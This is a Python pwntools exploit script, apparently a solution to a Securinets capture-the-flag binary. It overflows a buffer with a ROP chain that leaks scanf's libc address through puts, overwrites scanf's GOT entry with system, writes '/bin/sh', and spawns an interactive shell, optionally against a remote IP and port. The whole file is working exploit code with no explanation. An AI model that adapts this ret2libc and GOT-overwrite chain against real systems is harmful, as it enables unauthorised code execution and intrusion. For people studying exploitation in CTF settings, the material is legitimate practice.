#!/usr/bin/env python3.6
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
off = [104, 8, 40, 72, 88, 24, 56] 

if (args.GDB): 
    r = gdb.debug('./main', gdbscript=""" 
    break *main
    break *check_status
    break *__isoc99_scanf
    break *puts
    break *0x08049200
    """ )
elif (args.REMOTE): 
    r = remote('54.225.38.91', 1028) 
else: 
    r = process('./main') 


print(r.recvuntil(b"Welcome to Securinets o/\n\n")) 

OFFSET = 0x6c + 4
  
elf = ELF('./main', False) 

# MAIN = elf.symbols['main'] 
#puts_plt = elf.plt['puts'] 
#puts_got = elf.got['puts'] 
#check_status = elf.symbols['check_status'] 
scanf = 134529048                                                                                                               
MAIN = 134517175                                                                                                               
puts_plt = 134516784                                                                                                               
puts_got = 134529036                                                                                                               
check_status = 134517122  
ret = 0x080491b6
pop = 0x804901e 
pop_pop = 0x0804926a
scanf_plt = elf.plt["__isoc99_scanf"] 
chain = (p32(puts_plt) + p32(pop) + p32(scanf)) # leak 
chain +=  p32(elf.plt['__isoc99_scanf']) + p32(pop_pop) + p32(0x0804a008) + p32(scanf + 0x20) #write /bin/sh into scanf + 0x10 
chain += p32(scanf_plt) + p32(pop_pop) + p32(0x0804a008) + p32(scanf) 
chain +=  p32(scanf_plt) + b"AAAA" + p32(scanf + 0x20) #scanf is now system so this call invokes system("/bin/sh") 


payload = p32(ret)*(40 // 4) 
payload += chain

payload += b"A"*(108 - len(payload))
print(len(payload)) 
r.sendline(payload)  
data = r.recvline()
print(data)
 
print("OH YEA LEAKY", data) 

libc = ELF('./libc6_2.30-0ubuntu2_i386.so') 
#libc = ELF('/lib/i386-linux-gnu/libc.so.6') 
system = libc.symbols['system'] 
 
 
 
leak = u32(data[:4])

print("LEAK ", hex(leak) ) 

libc_base = leak - libc.symbols['__isoc99_scanf'] 

system = libc_base + system

r.sendline("/bin/sh")
r.sendline(p32(system)) 
r.interactive() 
